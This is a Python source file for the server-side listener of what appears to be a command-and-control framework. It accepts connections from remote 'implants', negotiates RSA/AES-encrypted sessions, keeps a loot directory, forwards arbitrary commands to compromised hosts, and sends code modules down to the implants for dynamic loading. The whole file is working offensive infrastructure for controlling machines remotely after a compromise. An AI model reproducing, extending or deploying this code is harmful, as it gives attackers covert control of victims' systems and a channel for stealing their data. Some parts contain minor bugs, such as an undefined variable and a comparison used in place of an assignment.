import http.server
import socket
import queue
import sys
import threading
import os, cgi
import time
import importlib
import errno

from types import MethodType
from base64 import b64encode, b64decode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util import Padding
from Crypto import Random

from common import bcolors as bc
from common import importer


class BSTCPListener(threading.Thread):
    """TCP implementation of the listener class"""

    def __init__(self, exit_on_exec, LHOST, LPORT, max_conns, loot_dir, name, RSA_KEY):     #Need to refer to parent menu or module?
        threading.Thread.__init__(self)
        self.kill_flag = False
        #init settings from listener module
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.name = name
        self.success = False
        self.max_conns = max_conns
        self.loot_dir = loot_dir
        self.RSA_KEY_FILE = RSA_KEY
        #Listener setup
        self.recv_q = queue.Queue()
        self.send_q = queue.Queue()
        self.command = ''
        self.RSA_KEY = None
        self.agent_list = []
        self.kill_flag = threading.Event()
        self.terminate_timeout=3.5
        if not os.path.exists(self.loot_dir):
            os.makedirs(self.loot_dir)
            bc.success("Created loot directory : {} for {}".format(
                    self.loot_dir, self.name))

    def run(self):
        """Main function called when listere thread starts"""

        try:
            #Check RSA key again, never too careful
            if not self.check_RSA_KEY():
                bc.err("RSA Key not valid. If you're stuck reset in home menu.")
                success == False
                raise ValueError("RSA Key invalid")
            bc.info('Starting listener on {}:{}'.format(self.LHOST, self.LPORT), True)  #Strong info
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                self.s.bind((self.LHOST, self.LPORT))
                self.s.listen(self.max_conns)      #Listen for max of N connectionsa
                self.success = True
            except Exception as e:
                bc.err_print('[!] ', '- Failed to bind socket : \n {}'.format( str(e)))
                self.s.shutdown(socket.SHUT_RDWR)
                self.s.close()
                return
            while True:
                #'print("DEBUG - Listener looping again!")
                self.s.settimeout(0.5)  #Socket must timeout to enable loop
                if not self.kill_flag.is_set():
                    #Run general COMMANDS
                    if not self.send_q.empty():
                        self.command = self.send_q.get_nowait()  #False non blocking
                        #It's hogging CPU, is the queue maybe full of blank strings?
                        if self.command == '':
                            continue
                        self.do_method()
                    #Handle TCP connection
                    try:
                        c = self.s.accept()    #Timeout on accept so we can read the queue
                        (conn, client_address) = c
                        agt = Agent(self, conn, client_address)
                        agt.name = "agt-"+ self.name + "-" + str(len(self.agent_list) +1)
                        self.agent_list.append(agt)
                        agt.start()
                        bc.blue_print("\n[!] ", "- Agent connected : {}.".format(agt.name))
                        c = None    #So the loop behaves
                    #If no agent in the timeout, let's get q stuff
                    except socket.timeout:
                        pass
                        #Now print anything in the queue:
                        if not self.recv_q.empty():
                            #print("reading q2")
                            resp = self.recv_q.get()
                            #print("reading q3")
                            bc.blue_print("[-] ", "- Received :".format(resp))
                            time.sleep(5) # TODO - remove
                else:
                    self.s.shutdown(socket.SHUT_RDWR)
                    self.s.close()
                    break #Kill thread

        except Exception as e:
            bc.warn_print("[!] ", "- Listener stopped: {}".format(e))
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            self.success == False
        finally:
            bc.blue_print("[-] ", "- Listener {} terminated.".format(self.name))

    ############################## Listener helper functions ##################################

    def do_method(self):
        """Interpret commands and call methods as required"""

        #Manage Send
        if self.command == "":  #Better safe, it's a nightmare when this isn't here
            pass
        else:
            cmd = "".join(self.command.split(" ")[:1])
            args = ' '.join(self.command.split(" ")[1:])
            try:
                #bc.info("{} calling {}".format(self.name, cmd))
                caller = getattr(self, cmd)
                #print("made a caller : {}".format(caller))
                if args:
                    #print("Calling {} with args {}".format(caller, args))
                    #caller(' '.join(args))
                    caller(args)
                else:
                    #print("calling no args")
                    caller()
            except ValueError as e:
                bc.warn("Exception, may be Missing arguments {} : {} \n{}".format(cmd, args, e))
            except Exception as e:
                print("Exception calling Lnr method, is it real? : {}".format(e))


    def send_command(self, command):
        """Send command to agents, but from the listener itself - unusual"""

        #bc.blue_print("[+] - ", "Sending Command: {}".format(command))
        for agent in agent_list:
            if agent.active:
                #Send to activated agents
                agent.send(command)
            else:
                pass

    def terminate(self):
        """Kill self and all agents"""

        #Free up the queue
        for agent in self.agent_list:
            #self.send_q.put('terminate')
            agent.kill_flag.set()
        for agent in self.agent_list:
            #agent.send_q.put('terminate')
            agent.join(self.terminate_timeout)
            if agent.is_alive() == 1:
                bc.err_print("[!] ", "- Could not elegantly kill Agent: {}, continuing.".format(agent.name))
                bc.warn("Trying emergency kill method.")
                agent._emergency_raise()
        self.terminated = True
        time.sleep(0.3)
        self.kill_flag.set()
        #TODO - you still need to kill the thread from the menu class with thread.join()

    def terminate_agent(self, agent):
        """Kill an individual agent"""

        #print("in terminate agent")
        agt = [a for a in self.agent_list if a.name == agent.name]
        #print("Agents : {}".format(agt))
        if len(agt) < 1:
            bc.warn("Agent : {} not found, can't terminate.".format(agent))
        else:
            for a in agt:
                #a.send_q.put('terminate')
                a.kill_flag.set()
                #print("I set it!")
                agent.join(self.terminate_timeout)
                if agent.is_alive() == 1:
                    bc.err("Could not terminate_agent: {}, continuing.".format(agent.name))
                del(a)

    def list_agents(self):
        """List all agents for this listener"""

        bc.blue_print("[-] - ","Following agents active:")
        for agent in self.agent_list:
            print(agent.name+ " - " + str(agent.client_addr))

    def check_RSA_KEY(self):
        """Check if an RSA key exists - future functionality will use this"""

        if not os.path.exists(self.RSA_KEY_FILE):
            return False
        else:
            with open(self.RSA_KEY_FILE) as f:
                try:
                    key = RSA.import_key(f.read())
                    self.RSA_KEY = key
                    return True
                except Exception as e:
                    bc.err("Key: {} not valid : {}".format(self.global_options['RSA_KEY'], e))
                    return False



class Agent(threading.Thread):
    """TCP implementation of an agent class, handles each individual connection"""

    def __init__(self, listener, conn, client_addr):
        threading.Thread.__init__(self)
        self.active = False
        self.kill_flag = threading.Event()
        self.listener = listener
        self.send_q = queue.Queue()
        self.recv_q = queue.Queue()
        self.name = "Example-Thread-Name"
        self.s = conn
        self.client_addr = client_addr
        self.ip = self.client_addr[0]
        self.port = self.client_addr[1]
        self.recv_buf = b''
        self.load_path = 'loaders/bs_tcp/'
        self.cmd_wait = 1.0
        self.modules = {
            'base' : {
                'commands' : {
                    'ping' : 'Check an agent is responding OK.',
                    'load' : 'Load a module into the agent.',
                    'terminate' : 'Terminate and close a give agent & implant.'} ,
                'help' : [
                    ['ping', 'Check an agent is responding OK.'],
                    ['terminate', 'Terminate and close a give agent & implant.'],
                    ['load', 'Load a module into the agent.']
                    ]
                    }
                }

    #This is the AgentCmd bit
    def run(self):
        """Main function run when Agent thread is started"""

        #Initial setup
        if not self.CRYPTSETUP():
            bc.err("Encryption setup failed. Exiting.")
            self.terminate()
            return
        bc.success("Established encrypted session : {}".format(self.name), True)
        self.REGISTER()
        #Main loop
        while True:

            if self.kill_flag.is_set():
                try:
                    self.send('terminate')
                    self.s.shutdown(socket.SHUT_RDWR)
                except Exception as e:
                    pass
                    #bc.warn("Exception in {} after kill flag set {}.".format(self.name, e))
                finally:
                    self.s.close()
                    return

            if self.active:
                if not self.send_q.empty():
                    self.command = self.send_q.get_nowait()  #False non blocking
                    #It's hogging CPU, is the queue maybe full of blank strings?
                    if not self.command:
                        time.sleep(0.5)
                        continue
                    self.do_command()
                    #print("DEBUG - Putting {} in the recv q".format(self.response))
                    #self.recv_q.put(self.response) #actually recieve needs to be managed e.g. file transfers
                time.sleep(0.5)

        bc.warn_print("\n[!] ", "- Agent {} terminated.".format(self.name))
        return

    ########################### Helper Functions ##############################

    def REGISTER(self):
        """Gives the agent its name and elicits a response, acts as
        a general comms check too"""

        self.send('REGISTER ' + self.name)
        success = self.recv(print_flag=False, string=True)
        if not success or (not 'Registered' in success):
            bc.err("Client side registration failed for : {}\nsucess :{}".format(
                    self.name, success))
        else:
            bc.success("{} Registered.".format(self.name), True)

    def CRYPTSETUP(self):
        """Sets up an encrypted tunnel to the dropper, by generating
        an AES key and encrypting it with the droppers ephemeral public key"""

        #Receive the RSA key from implant
        recv = b''
        while True:
            chunk = self.s.recv(2048)
            recv += chunk
            if len(chunk) < 2048:
                break
        #Import it and send AES key back
        try:
            self.CLNT_PUB_KEY = RSA.import_key(b64decode(recv))
            #bc.info("Got public key : {}".format(self.CLNT_PUB_KEY.exportKey()), True)
            #Encrypt our AES Key with this public key and send back
            self.AES_KEY = Random.get_random_bytes(32)  #256 bit random key
            #bc.info("Created AES Key : {}".format(self.AES_KEY))
            encryptor = PKCS1_OAEP.new(self.CLNT_PUB_KEY)
            ciphertext = b64encode(encryptor.encrypt(self.AES_KEY))
            self.s.send(ciphertext)
            success = self.recv(string=True, print_flag=False)
            if 'success' in success:
                #bc.info("Got implant success message")
                self.send('success')
                #bc.info("Sent listnere success message.")
                return True
        except Exception as e:
            bc.err("Exception setting up crypto : {}".format(e))
            bc.err("Msy not have received proper RSA key from implant {}:\n {}".format(
                    self.name, self.CLNT_PUB_KEY))
            return False

    def encrypt(self, message):
        """Encrypts a string  ro bytes objectpassed to it using the
        agents AES key"""

        try:
            if isinstance(message, str) and message != '':
                message = message.encode()
            if isinstance(message, bytes) and message != b'':
                IV = Random.new().read(AES.block_size)
                encryptor = AES.new(self.AES_KEY, AES.MODE_CBC, IV)
                padded_message = Padding.pad(message, AES.block_size)
                encrypted_message = encryptor.encrypt(padded_message)
                return (IV, encrypted_message)
            else:
                bc.err("Unsupported response format : {} : {}".format(message, type(message)))
                return False
        except Exception as e:
            bc.err("Encryption failure : {}".format(e))
            return False

    def decrypt(self, IV, message):
        """Decrypts a string  or bytes objectpassed to it using the
        agents AES key and message IV"""

        try:
            if isinstance(message, str) and message != '':
                message = message.encode()
            if isinstance(message, bytes) and message != b'':
                decryptor = AES.new(self.AES_KEY, AES.MODE_CBC, IV)
                #print("made decryptor")
                decrypted_padded_message = decryptor.decrypt(message)
                #print("got padded message")
                decrypted_message = Padding.unpad(
                        decrypted_padded_message, AES.block_size)
                #print("Unpadded")
                return decrypted_message
            else:
                bc.err("Unsupported response format : {} : {}".format(message, type(message)))
                return False
        except Exception as e:
            bc.err("Decryption failure : {}".format(e))
            return False

    def do_command(self):
        """parse command string and call any agent methods, before Sending
        any relvant commands down to the dropper itself"""

        #Manage Send
        if self.command == "":
            pass
        else:
            cmd = "".join(self.command.split(" ")[:1])
            args = ' '.join(self.command.split(" ")[1:])
            try:
                #bc.info("Calling {} : {}".format(cmd, args))
                caller = getattr(self, cmd)
                #print("made a caller : {}".format(caller))
                if args:
                    #print("Calling {} with args {}".format(caller, ' '.join(args)))
                    #caller(' '.join(args))
                    caller(args)
                else:
                    #print("calling no args")
                    caller()
            except ValueError as e:
                bc.warn("Value error, missing arguments? {} : {} \n{}".format(
                        cmd, args, e))
            except Exception as e:
                #print("Exception - default : {}".format(e))
                resp = self.default()
                #ATM do nothing with resp

    def send(self, message, debug = False):
        """Send string to implant, automatically encrypts the data and manages
                conversion of the data to bytes objects before sending."""

        if not message:
            bc.info("No mesasge to send. not sending.")
            return
        try:
            if debug:
                bc.info("Sending {} to {}.".format(message, str(self.name)))
            enc = self.encrypt(message)
            if enc:
                if debug:
                    print("Message - {} IV : {}".format(message, enc[0]))
                    bc.info("Message length : {}".format(len(b''.join(enc))))
                message = b':' + b':'.join([b64encode(i) for i in enc]) + b':' #colon IV colon message, colon
                if message:
                    self.s.sendall(message)  #Sendall instead
            else:
                bc.err("Encryption failed in repl function.")
        except BrokenPipeError as e:
            bc.err("Agent {} not responding. Terminating".format(self.name))
            self.terminate()
            bc.warn("Terminate failed, falling back on emergency method.")
            raise Exception("Agent {} dead.".format(self.name))
        except Exception as e:
            bc.err("Failed to send message: {}".format(e))


    def recv(self,  print_flag=True, debug=False, string=False, blocking=True):
        """Receive data from implant, handles decryption of the data and will
                continue to receive until no more data is sent."""

        if debug:
            bc.info("Agent {} receiving data.".format(self.name))

        if not blocking:
            #Sockets should be non-blocking
            self.s.setblocking(0)
            if debug:
                bc.info("Set nonblocking.")
        else:
            self.s.setblocking(1)
            if debug:
                bc.info("Set blocking.")

        #get traffic from network and append to recv_buffer
        try:
            while True:
                chunk = self.s.recv(2048)
                self.recv_buf += chunk
                if len(chunk) < 2048:
                    break
        except socket.error as e:
            err = e.args[0]
            #err, text = e.args
            if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                #bc.info("No data received by socket in {}".format(self.name))
                if debug:
                    bc.info("No data received by socket in {}".format(self.name))
            else:
                # a "real" error occurred
                bc.err("Socket error in {} receive : {}".format(self.name, e))


        #parse recv buffer for next message
        #We should have a colon at position 1,
        #another after the 16 byte IV, then another somwhere else again
        if self.recv_buf.count(b':') < 3:
            if debug:
                bc.err("Error, no data to rev. Didn't receive at least 1 complete message")
            return False
        elif self.recv_buf.find(b':')>0 and self.recv_buf.find(b':', 1) != AES.block_size + 1:
            bc.err("Receive buffer contains malformed messages!")
            return False
        else:
            #first col already at pos 0 from previous checks
            col1 = 0
            col2 = self.recv_buf.find(b':', 1 )
            col3 = self.recv_buf.find(b':', col2 +1 )
            message = self.recv_buf[:col3 + 1]  #Get message FIFO style
            self.recv_buf = self.recv_buf[col3 + 1:]     #Also remove the message from queue
            if debug:
                bc.info("Encrypted message : {}".format(message))
                bc.info("Decoding IV from : {}".format(message[ col1 + 1 : col2 ]))
            IV = b64decode(message[ col1 + 1 : col2 ])
            ciphertext = b64decode(message[ col2 + 1 : col3 + 1 ])

        #Decryption return either message, or False
        if debug:
            bc.info("IV : {}".format(IV))
        recv = self.decrypt(IV, ciphertext)
        if b'ERROR Exception' in recv:
            bc.err("Exception occured in implant:\n{}".format(recv))
        #Print if flag set
        if print_flag:
            bc.blue_print("\n[+] ", "{} : \n{}".format(self.name, recv.decode()))
        #return string or bytes as requested
        if string:
            if debug:
                bc.info("Recv returning string.")
            return recv.decode()
        else:
            if debug:
                bc.info("Recv returning bytes.")
            return recv

    def load_agent_methods(self):
        """Load modules into this agent dynamically, reading in the module
        spec and loading from that dictionary."""

        #print("Getting mod spec")
        mod_spec = self.send_q.get()    #In this case, the args are passed in a second send
        #print("Agent {} got mod spec : type: {},\n {}".format(self.name, type(mod_spec), mod_spec))
        try:
            #Set up commands dict to populate
            self.modules[mod_spec['mod_name']] = { 'commands' : {}, 'help' : []}
            #self.modules[mod_spec['mod_name']]['commands'] = {}
            #Go one method at a time, only if a menu method is specified
            for method in (i for i in mod_spec['methods'] if i['agent'] ):
                #bc.blue_print("[-] ", "- Adding method {} to agent {}".format(method['name'], self.name))
                #get and import the module to be added
                import_dict = {method['name'] : ''}
                filename = mod_spec['load_dir'] + method['agent']
                #print("Filename - {}".format(filename))
                with open(filename, 'r') as f:
                    #print("Opened file")
                    for line in f:
                        #print(line)
                        import_dict[method['name']] += line
                #print("open complete : {}".format(import_dict))
                mod, funcs = importer.bs_import(import_dict)
                if not mod or not funcs:
                    raise ImportError("BSImporter failed to import module code.")

                #bc.blue_print("[-] ","Loading : {} with funcs:\n{}".format(mod, funcs))
                #print("imported")
                self.modules[mod_spec['mod_name']]['commands'][mod.__name__] = method['help']
                #print("added, modules information")
                setattr(self, mod.__name__ , MethodType(mod.main, self))
                #print('Set functions')

        except Exception as e:
            bc.err_print("[!] ", "- Exception loading agent module:\n\t{}".format(e))

        #Now load into each agents
        self.load_implant_methods(mod_spec)

        #Finally populate the modules help
        #h = mod_spec['help']
        self.modules[mod_spec['mod_name']]['help'] = mod_spec['help']


    def load_implant_methods(self, mod_spec):
        """Loads modules into the dropper, converting the dictionaries
         to strings and sending it down the tunnel as needed"""

        try:
            #Go one method at a time, only if a menu method is specified
            for method in (i for i in mod_spec['methods'] if i['implant']):
                #bc.blue_print("[-] ", "- Adding method {} to implant {}".format(method['name'], self.name))
                #get and import the module to be added
                import_dict = {method['name'] : ''}
                filename = mod_spec['load_dir'] + method['implant']
                #print("Filename - {}".format(filename))
                with open(filename, 'r') as f:
                    #print("Opened file")
                    for line in f:
                        #print(line)
                        import_dict[method['name']] += line
                #print("open complete : {}".format(import_dict))
                #Send it on down for inclusion
                #print("DEBUG - preparing to send!")
                self.send('load ' +  b64encode(str(import_dict).encode()).decode())
                #print("DEBUG - Commadn to send :{}".format(self.command))
                #print("DEBUG - sent!")
                success = self.recv(print_flag=False, string = True)    #No printing!
                #print("Testing {} against {}".format(self.response, 'load complete'))
                if 'Successfully Loaded' not in success:
                    bc.err_print("[!] ", "- Method {} did not load in {} client side.".format(method['name'], self.name))
                else:
                    self.modules[mod_spec['mod_name']]['commands'][method['name']] = method['help']
                    bc.success("Loaded : {} in {}.".format(method['name'], self.name))
        except Exception as e:
            bc.err_print("[!] ", "- Exception loading implant module:\n\t{}".format(e))
            #Clear out the recv_buffer Now
            time.sleep(1)
            agent.recv(print_flag=False, blocking=False)

    ############################### Commands ###################################

    def terminate(self):
        """Kill self and send commands to dropper to do the same"""

        if self.active == False and self.kill_flag.is_set(): #If already terminated, don't continue
            return
        try:
            self.send('terminate')
        except BrokenPipeError:
            bc.err("Terminating. Agent {}, but comms already broken.".format(self.name))
        except Exception as e:
            bc.err("Exception:\n{}".format(e))
        finally:
            self.active=False
            self.kill_flag.set()
            self.command = ''

    def _emergency_raise(self):
        """Raise an exception - dirty way of killing the thread"""

        #Generic exception because this is unusual
        raise Exception("Emergency kill function.")


    def default(self):
        """method called when no agent method exists, sends any
        command to the dropper, to be parsed there instead"""

        #print("DEBUG - agent default")
        if self.command:
            self.send(self.command)
            time.sleep(self.cmd_wait)   #LEt agents respond quickly for seamlessness
            return self.recv(print_flag = True, debug=False, string=True)
        else:
            pass

    def ping(self, args=None):
        """connectivity test between agent and dropper"""

        if args:
            self.send('ping ' + str(args))
        else:
            self.send('ping')
        resp = self.recv(print_flag=False, string=True)
        if 'PONG' in resp:
            bc.success("PONG{}- response from {}".format(resp[4:], self.name))
        else:
            bc.err("No PONG from {}\n instead: {}".format(self.name, resp))

def main():
    bc.err_print("[!] ", "- You're running the TCP listener module as main, did you mean to?")

if __name__ == '__main__':
    main()
